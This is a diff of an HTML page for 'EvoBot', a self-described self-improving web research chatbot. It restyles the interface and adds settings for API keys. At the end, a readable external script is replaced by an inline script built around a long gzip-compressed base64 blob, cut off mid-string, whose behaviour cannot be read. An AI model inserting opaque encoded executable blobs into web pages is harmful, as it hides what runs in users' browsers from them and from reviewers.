@@ -3,100 +3,102 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#07101d">
-<title>EvoBot Internet — Self-Improving Web Agent</title>
+<meta name="theme-color" content="#0b0f14">
+<title>EvoBot</title>
 <style>
-:root{--bg:#07101d;--card:#0d1829;--card2:#101f35;--line:#253a5b;--text:#eef5ff;--muted:#96a9c8;--a:#7762ff;--b:#20d6a3;--w:#eda63e;--bad:#ff6678}
-*{box-sizing:border-box}body{margin:0;min-height:100vh;background:radial-gradient(circle at 12% 0,#1b2b5d 0,transparent 32%),linear-gradient(180deg,#07101d,#08111f);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial}
-.wrap{max-width:1180px;margin:auto;padding:24px 14px 70px}.hero{display:flex;justify-content:space-between;gap:20px;align-items:flex-start;flex-wrap:wrap}.hero h1{font-size:clamp(42px,7vw,72px);letter-spacing:-.055em;line-height:.95;margin:0}.hero h1 span{color:#9c8cff}.hero p{max-width:840px;color:var(--muted);line-height:1.6}.badge{border:1px solid #355079;background:#111d30;border-radius:999px;padding:9px 12px;font-size:13px}.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--b);box-shadow:0 0 14px var(--b);margin-right:7px}
-.grid{display:grid;grid-template-columns:repeat(12,1fr);gap:14px;margin-top:18px}.card{background:linear-gradient(180deg,rgba(17,29,50,.98),rgba(10,18,31,.98));border:1px solid var(--line);border-radius:20px;padding:17px;box-shadow:0 20px 55px rgba(0,0,0,.16)}.stat{grid-column:span 3}.half{grid-column:span 6}.wide{grid-column:span 12}
-.label{font-size:12px;color:var(--muted)}.value{font-size:28px;font-weight:850;margin-top:6px}.title{font-size:17px;font-weight:800;margin-bottom:11px}.sub{font-size:13px;color:var(--muted);line-height:1.55}.row{display:flex;gap:9px;flex-wrap:wrap;align-items:center}
-textarea,input{width:100%;background:#070e19;border:1px solid #31496f;color:#fff;border-radius:13px;padding:13px 14px;font:inherit;outline:none}textarea{min-height:110px;resize:vertical}textarea:focus,input:focus{border-color:var(--a)}
-button{border:0;border-radius:13px;background:linear-gradient(135deg,var(--a),#536dfe);color:#fff;font-weight:780;padding:12px 15px;cursor:pointer}button.secondary{background:#18253d;border:1px solid #344d75}button.good{background:linear-gradient(135deg,#0a9970,var(--b))}button.warn{background:linear-gradient(135deg,#bd7410,var(--w))}button.bad{background:linear-gradient(135deg,#a93648,var(--bad))}
-.out{margin-top:11px;white-space:pre-wrap;background:#060c16;border:1px solid #1f304d;border-radius:13px;padding:13px;min-height:74px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#dce8ff;overflow:auto;max-height:640px}.toolgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}.tool{background:#0a1220;border:1px solid #213451;border-radius:14px;padding:12px}.tool b{display:block;margin-bottom:4px}.tool span{font-size:12px;color:var(--muted)}.chips{display:flex;gap:7px;flex-wrap:wrap}.chip{padding:6px 9px;border:1px solid #30466b;border-radius:999px;color:#cad8f2;font-size:12px;cursor:pointer}.event{padding:10px 0;border-bottom:1px solid #1e2b45}.event small{color:var(--muted)}.hidden{display:none!important}.tabs{display:flex;gap:7px;margin-bottom:10px}.tab{background:#111d31;border:1px solid #30486e;padding:8px 10px;font-size:12px}.tab.active{background:#5c50d7}.status-good{color:#55e1b8}.status-bad{color:#ff8593}
-@media(max-width:840px){.stat{grid-column:span 6}.half{grid-column:span 12}.toolgrid{grid-template-columns:repeat(2,1fr)}}@media(max-width:520px){.stat{grid-column:span 6}.wrap{padding:18px 11px 48px}.card{border-radius:16px;padding:14px}.hero h1{font-size:44px}.toolgrid{grid-template-columns:1fr}}
+:root{
+  --bg:#0b0f14;--panel:#11161d;--panel2:#151b23;--line:#27303b;--text:#f4f7fb;
+  --muted:#9aa7b7;--accent:#7c6cff;--accent2:#2bd5a7;--danger:#ff6678;--shadow:0 18px 50px rgba(0,0,0,.22)
+}
+*{box-sizing:border-box}html,body{margin:0;height:100%;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+button,textarea,input{font:inherit}button{color:inherit}
+.app{min-height:100dvh;display:flex;flex-direction:column;background:radial-gradient(circle at 50% -20%,rgba(124,108,255,.12),transparent 36%),var(--bg)}
+.topbar{position:sticky;top:0;z-index:20;height:58px;display:flex;align-items:center;justify-content:space-between;padding:0 max(14px,env(safe-area-inset-left)) 0 max(14px,env(safe-area-inset-right));border-bottom:1px solid rgba(255,255,255,.06);background:rgba(11,15,20,.88);backdrop-filter:blur(16px)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:780;letter-spacing:-.02em}.logo{width:31px;height:31px;border-radius:10px;display:grid;place-items:center;background:linear-gradient(145deg,var(--accent),#4f8cff);box-shadow:0 8px 24px rgba(124,108,255,.25);font-weight:900}.status{display:flex;align-items:center;gap:7px;color:var(--muted);font-size:12px}.dot{width:8px;height:8px;border-radius:50%;background:var(--accent2);box-shadow:0 0 12px rgba(43,213,167,.8)}
+.iconbtn{border:0;background:transparent;border-radius:10px;width:40px;height:40px;display:grid;place-items:center;cursor:pointer}.iconbtn:hover{background:rgba(255,255,255,.06)}
+.chat{flex:1;width:100%;max-width:860px;margin:0 auto;padding:26px 16px 155px;overflow:visible}.empty{min-height:58dvh;display:grid;place-items:center;text-align:center;padding:40px 0}.empty h1{font-size:clamp(34px,7vw,54px);margin:0 0 10px;letter-spacing:-.045em}.empty p{max-width:620px;margin:0 auto;color:var(--muted);line-height:1.6}.suggestions{display:flex;flex-wrap:wrap;justify-content:center;gap:9px;margin-top:24px}.suggestion{border:1px solid var(--line);background:var(--panel);color:#dfe6ef;padding:10px 13px;border-radius:999px;cursor:pointer;font-size:13px}.suggestion:hover{border-color:#435266;background:var(--panel2)}
+.msg{display:flex;gap:12px;margin:0 0 24px}.avatar{flex:0 0 30px;width:30px;height:30px;border-radius:9px;display:grid;place-items:center;font-weight:800;font-size:12px}.avatar.bot{background:linear-gradient(145deg,var(--accent),#4f8cff)}.avatar.user{background:#263140}.bubble{min-width:0;flex:1;line-height:1.66;font-size:15.5px}.bubble.user{white-space:pre-wrap}.bubble.bot{white-space:pre-wrap}.meta{color:var(--muted);font-size:11px;margin-top:8px}.sources{margin-top:12px;display:flex;gap:7px;flex-wrap:wrap}.source{font-size:12px;color:#cfd8e6;border:1px solid var(--line);background:#101721;padding:6px 9px;border-radius:999px;text-decoration:none;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.typing{color:var(--muted)}
+.composer-wrap{position:fixed;left:0;right:0;bottom:0;z-index:25;padding:10px 14px max(12px,env(safe-area-inset-bottom));background:linear-gradient(180deg,rgba(11,15,20,0),rgba(11,15,20,.92) 28%,#0b0f14 66%)}.composer{max-width:860px;margin:0 auto;border:1px solid #303947;background:#151b23;border-radius:22px;box-shadow:var(--shadow);padding:10px 10px 8px;display:flex;gap:8px;align-items:flex-end}.composer textarea{flex:1;min-height:44px;max-height:180px;resize:none;background:transparent;border:0;outline:0;color:var(--text);padding:11px 10px;line-height:1.45}.composer textarea::placeholder{color:#798799}.send{flex:0 0 42px;width:42px;height:42px;border:0;border-radius:14px;background:linear-gradient(145deg,var(--accent),#5c8cff);display:grid;place-items:center;cursor:pointer;font-size:18px}.send:disabled{opacity:.45;cursor:default}.under{max-width:860px;margin:7px auto 0;color:#6f7c8b;font-size:10.5px;text-align:center}
+.overlay{position:fixed;inset:0;z-index:40;background:rgba(0,0,0,.48);display:none}.overlay.show{display:block}.drawer{position:absolute;right:0;top:0;bottom:0;width:min(380px,92vw);background:#10151c;border-left:1px solid var(--line);padding:18px;overflow:auto;box-shadow:-20px 0 55px rgba(0,0,0,.3)}.drawer-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}.drawer h2{font-size:19px;margin:0}.section{padding:14px 0;border-top:1px solid rgba(255,255,255,.07)}.section:first-of-type{border-top:0}.section h3{font-size:13px;margin:0 0 10px;color:#d9e2ee}.small{font-size:12px;color:var(--muted);line-height:1.55}.field{width:100%;margin-top:8px;border:1px solid #303947;background:#0b1017;color:#fff;border-radius:12px;padding:11px 12px;outline:0}.field:focus{border-color:var(--accent)}.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}.pillbtn{border:1px solid #344152;background:#171e27;border-radius:11px;padding:9px 11px;cursor:pointer;font-size:12px}.pillbtn.primary{background:linear-gradient(145deg,var(--accent),#5b78ff);border-color:transparent}.switch{display:flex;align-items:center;justify-content:space-between;gap:12px}.toggle{width:46px;height:26px;border-radius:999px;border:1px solid #354152;background:#1a222c;position:relative;cursor:pointer}.toggle i{position:absolute;width:20px;height:20px;left:2px;top:2px;border-radius:50%;background:#8997a7;transition:.2s}.toggle.on{background:rgba(43,213,167,.18);border-color:#2a8d73}.toggle.on i{left:22px;background:var(--accent2)}.statline{display:flex;justify-content:space-between;font-size:12px;padding:6px 0;color:#c8d3e0}.activity{max-height:220px;overflow:auto;border:1px solid #27303b;background:#0b1017;border-radius:12px;padding:10px}.event{padding:8px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:12px;line-height:1.45}.event:last-child{border-bottom:0}.event small{color:var(--muted)}
+.toast{position:fixed;left:50%;bottom:118px;transform:translateX(-50%);z-index:60;background:#171e27;border:1px solid #344152;border-radius:999px;padding:9px 13px;font-size:12px;box-shadow:var(--shadow);opacity:0;pointer-events:none;transition:.2s}.toast.show{opacity:1}
+@media(max-width:600px){.topbar{height:54px}.chat{padding:20px 13px 145px}.msg{gap:9px}.avatar{width:28px;height:28px;flex-basis:28px}.bubble{font-size:15px}.composer-wrap{padding-left:9px;padding-right:9px}.composer{border-radius:19px}.status span:last-child{display:none}.empty{min-height:52dvh}.suggestions{justify-content:flex-start;text-align:left}.suggestion{font-size:12px}}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="hero">
-    <div><h1>EvoBot <span>Internet</span></h1><p>A self-improving public-web agent. It can search the live web, read public webpages and PDFs through a reader service, gather source material, remember useful facts, and optionally use an external AI brain to synthesize multi-source answers.</p></div>
-    <div class="badge"><span class="dot"></span>public-web research mode</div>
-  </div>
-
-  <div class="grid">
-    <div class="card stat"><div class="label">Internet</div><div id="webStat" class="value">OFF</div></div>
-    <div class="card stat"><div class="label">Sources fetched</div><div id="sourceCount" class="value">0</div></div>
-    <div class="card stat"><div class="label">Memory items</div><div id="memoryCount" class="value">0</div></div>
-    <div class="card stat"><div class="label">Failures learned</div><div id="failureCount" class="value">0</div></div>
-
-    <div class="card half">
-      <div class="title">Ask EvoBot anything</div>
-      <textarea id="task" placeholder="Examples: research the latest ISRO launch; browse https://www.isro.gov.in/; compare current AI search tools; find official sources about..."></textarea>
-      <div class="row" style="margin-top:9px"><button class="good" onclick="runTask()">Run task</button><button class="secondary" onclick="clearTask()">Clear</button><button class="secondary" onclick="copyAnswer()">Copy</button></div>
-      <div id="answer" class="out">Ready.</div>
-      <div class="sub" style="margin-top:9px">For unknown questions, EvoBot automatically uses web search when the web connector is enabled.</div>
+<div class="app">
+  <header class="topbar">
+    <div class="brand"><div class="logo">E</div><span>EvoBot</span></div>
+    <div class="row">
+      <div class="status" title="Background learning runs while this tab is open"><span class="dot"></span><span id="statusText">learning</span></div>
+      <button class="iconbtn" aria-label="Open settings" onclick="openDrawer()">☰</button>
     </div>
+  </header>
 
-    <div class="card half">
-      <div class="title">Internet research connector</div>
-      <div class="tabs"><button id="webOff" class="tab active" onclick="toggleWeb(false)">Web off</button><button id="webOn" class="tab" onclick="toggleWeb(true)">Public web on</button></div>
-      <div id="webCfg" class="hidden">
-        <input id="jinaKey" type="password" placeholder="Jina Search/Reader API key (session only)">
-        <div class="row" style="margin-top:9px"><button onclick="saveWeb()">Use this session</button><button class="secondary" onclick="testWeb()">Test live search</button></div>
-      </div>
-      <div id="webTest" class="out">Web search is disabled.</div>
-      <div class="sub" style="margin-top:9px">Direct public-URL reading can work without a key at a lower rate limit. Search requires a Jina key. The key stays in this browser tab's session storage and is sent directly to Jina.</div>
-    </div>
-
-    <div class="card wide">
-      <div class="title">Internet capabilities</div>
-      <div class="toolgrid">
-        <div class="tool"><b>Live web search</b><span>search current public webpages and return source URLs/content</span></div>
-        <div class="tool"><b>URL reader</b><span>open public webpages and many PDFs as clean text</span></div>
-        <div class="tool"><b>Deep research</b><span>collect search material and optionally synthesize it with an AI brain</span></div>
-        <div class="tool"><b>Automatic browsing</b><span>unknown tasks can fall back to web research instead of UNKNOWN</span></div>
-        <div class="tool"><b>Persistent memory</b><span>remember and recall facts locally in this browser</span></div>
-        <div class="tool"><b>Failure learning</b><span>record unsuccessful tasks and use them to expand future routing</span></div>
-        <div class="tool"><b>Source-aware answers</b><span>preserve source URLs in research material and synthesis prompts</span></div>
-        <div class="tool"><b>AI brain bridge</b><span>optional OpenAI-compatible endpoint for reasoning over retrieved sources</span></div>
+  <main id="chat" class="chat">
+    <div id="empty" class="empty">
+      <div>
+        <h1>What can I help with?</h1>
+        <p>EvoBot can research the public web, remember useful context, learn from failures, and continuously evolve its runtime core while this tab remains open.</p>
+        <div class="suggestions">
+          <button class="suggestion" data-prompt="Research the latest ISRO developments and cite sources">Research the latest ISRO developments</button>
+          <button class="suggestion" data-prompt="Explain quantum entanglement simply">Explain quantum entanglement</button>
+          <button class="suggestion" data-prompt="Compare the latest AI coding assistants using current web sources">Compare AI coding assistants</button>
+          <button class="suggestion" data-prompt="Build a plan for a mobile food delivery app">Plan an app</button>
+        </div>
       </div>
     </div>
+    <div id="messages"></div>
+  </main>
 
-    <div class="card half">
-      <div class="title">Optional AI brain</div>
-      <div class="tabs"><button id="aiOff" class="tab active" onclick="toggleAi(false)">AI off</button><button id="aiOn" class="tab" onclick="toggleAi(true)">AI on</button></div>
-      <div id="aiCfg" class="hidden">
-        <input id="aiEndpoint" placeholder="OpenAI-compatible chat completions URL">
-        <div class="row" style="margin-top:8px"><input id="aiModel" placeholder="Model name"><input id="aiKey" type="password" placeholder="API key (session only)"></div>
-        <div class="row" style="margin-top:8px"><button onclick="saveAi()">Use this session</button><button class="secondary" onclick="testAi()">Test AI</button></div>
-      </div>
-      <div class="sub">When enabled, EvoBot can synthesize retrieved web material into a direct answer. No AI credential is bundled into this public site.</div>
+  <div class="composer-wrap">
+    <div class="composer">
+      <textarea id="prompt" rows="1" placeholder="Message EvoBot"></textarea>
+      <button id="send" class="send" aria-label="Send">↑</button>
     </div>
-
-    <div class="card half">
-      <div class="title">Self-improvement</div>
-      <div class="row"><button class="secondary" onclick="observe()">Observe failures</button><button class="warn" onclick="evolve()">Evolve routing</button><button class="bad" onclick="resetLearning()">Reset learned state</button></div>
-      <div id="evolution" class="out">Ready.</div>
-      <div class="sub" style="margin-top:9px">This static browser version improves routing/memory and records failures. It does not silently retrain foundation-model weights.</div>
-    </div>
-
-    <div class="card half">
-      <div class="title">Quick commands</div>
-      <div id="examples" class="chips"></div>
-    </div>
-
-    <div class="card half">
-      <div class="title">Memory</div>
-      <div id="memory" class="out">No memory yet.</div>
-    </div>
-
-    <div class="card wide">
-      <div class="title">Evolution history</div>
-      <div id="history"></div>
-    </div>
+    <div class="under">Background learning and runtime-core evolution continue while this page is open.</div>
   </div>
 </div>
-<script src="./app.js"></script>
+
+<div id="overlay" class="overlay" onclick="if(event.target===this)closeDrawer()">
+  <aside class="drawer">
+    <div class="drawer-head"><h2>EvoBot settings</h2><button class="iconbtn" onclick="closeDrawer()">✕</button></div>
+
+    <div class="section">
+      <div class="switch"><div><h3>Continuous learning</h3><div class="small">Learns from conversations and failures every minute while the tab is open.</div></div><div id="learnToggle" class="toggle on" onclick="toggleLearning()"><i></i></div></div>
+    </div>
+
+    <div class="section">
+      <div class="switch"><div><h3>Public web</h3><div class="small">Uses a no-key public-search fallback; a Jina key improves search reliability.</div></div><div id="webToggle" class="toggle on" onclick="toggleWeb()"><i></i></div></div>
+      <input id="jinaKey" class="field" type="password" placeholder="Optional Jina API key (session only)">
+      <div class="row" style="margin-top:8px"><button class="pillbtn primary" onclick="saveJina()">Save for session</button><button class="pillbtn" onclick="testWeb()">Test web</button></div>
+    </div>
+
+    <div class="section">
+      <h3>Optional AI brain</h3>
+      <div class="small">For open-ended reasoning, connect an OpenAI-compatible model endpoint. Credentials stay in this browser session.</div>
+      <input id="aiEndpoint" class="field" placeholder="Chat-completions endpoint">
+      <input id="aiModel" class="field" placeholder="Model name">
+      <input id="aiKey" class="field" type="password" placeholder="API key (session only)">
+      <div class="row" style="margin-top:8px"><button class="pillbtn primary" onclick="saveAI()">Save for session</button><button class="pillbtn" onclick="testAI()">Test AI</button></div>
+    </div>
+
+    <div class="section">
+      <h3>Background state</h3>
+      <div class="statline"><span>Runtime core</span><strong id="coreVersion">v1</strong></div>
+      <div class="statline"><span>Knowledge items</span><strong id="knowledgeCount">0</strong></div>
+      <div class="statline"><span>Failures learned</span><strong id="failureCount">0</strong></div>
+      <div class="statline"><span>Sources read</span><strong id="sourceCount">0</strong></div>
+      <div class="statline"><span>Last learning cycle</span><strong id="lastCycle">—</strong></div>
+    </div>
+
+    <div class="section">
+      <h3>Evolution activity</h3>
+      <div id="activity" class="activity"><div class="small">No evolution events yet.</div></div>
+      <div class="row" style="margin-top:9px"><button class="pillbtn" onclick="runLearningCycle(true)">Improve now</button><button class="pillbtn" onclick="newChat()">New chat</button></div>
+    </div>
+  </aside>
+</div>
+<div id="toast" class="toast"></div>
+<script>(async()=>{const b64="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